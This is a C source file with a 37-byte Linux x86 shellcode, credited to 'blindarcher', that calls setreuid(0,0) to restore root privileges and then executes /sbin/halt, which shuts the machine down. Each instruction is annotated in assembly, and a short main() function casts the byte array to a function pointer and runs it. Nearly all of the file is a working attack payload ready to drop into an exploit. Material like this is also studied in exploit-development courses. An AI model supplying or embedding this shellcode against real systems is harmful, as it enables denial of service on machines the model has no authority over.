/*
	Title:  setreuid & execve(/sbin/halt) shellcode (37 bytes)
	Author: blindarcher <blindarcher[no SPAM]outlook dot com>
	Arch:   Linux x86
*/

char shellcode[]=
    // setreuid(0,0)
    "\x31\xdb"              // 	xor    %ebx,%ebx	<-- set zero in ebx
    "\xf7\xe3"              //  mul    %ebx		<-- set zero in eax & edx 
    "\x89\xd9"              // 	mov    %ebx,%ecx	<-- set zero in to ecx
    "\xb0\x46"              // 	mov    $0x46,%al	<-- set the syscall #0x46 in al
    "\xcd\x80"              // 	int    $0x80		<-- call the kernel
    // execve(/sbin/halt, /sbin/halt)
    "\x52"                  // 	push   %edx		<-- push zero into stack
    "\x68\x68\x61\x6c\x74"  //  push   $0x746c6168	<-- push the string "halt" into stack
    "\x68\x6e\x2f\x2f\x2f"  //  push   $0x2f2f2f6e	<-- push the string "n///" into stack
    "\x68\x2f\x73\x62\x69"  //  push   $0x6962732f	<-- push the string "/sbi" into stack
    "\x89\xe3"              //  mov    %esp,%ebx	<-- set the pointer esp into ebx
    "\x52"                  // 	push   %edx		<-- push zero into stack
    "\x53"                  // 	push   %ebx		<-- push the pointer ebx into stack
    "\x89\xe1"              //  mov    %esp,%ecx	<-- set the pointer esp into ecx
    "\x6a\x0b"              //  push   $0xb		<-- push the syscall #0xb into stack
    "\x58"                  // 	pop    %eax		<-- pop the syscall #0xb into eax
    "\xcd\x80";             //  int    $0x80		<-- call the kernel

main()
{
    printf("Shellcode lenght: %d bytes\n", strlen(shellcode));
    void (*fp) (void);        // declare a function pointer, fp
    fp = (void *) shellcode;  // set the address of fp to our shellcode
    fp();                     // execute the function (our shellcode)
}
